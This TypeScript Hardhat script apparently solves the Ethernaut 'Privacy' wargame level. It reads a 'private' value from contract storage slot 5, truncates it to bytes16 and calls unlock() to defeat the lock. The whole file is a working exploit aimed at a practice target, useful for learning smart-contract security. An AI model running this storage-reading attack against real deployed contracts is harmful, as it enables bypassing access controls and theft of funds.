import { ethers } from "hardhat";

const CONTRACT_NAME = "Privacy";
const CONTRACT_ADDRESS = "0xC1a9e386268AeA8F7269aB78D3AeF9Dc8F224ed1";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //hack storage
  const storageValue = await ethers.provider?.getStorageAt(CONTRACT_ADDRESS, 5);
  const castToBytes16 = storageValue.slice(0, 16 * 2 + 2);
  console.log(castToBytes16);

  const txAttack = await contract.unlock(castToBytes16);
  await txAttack.wait();

  if (!(await contract.locked())) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
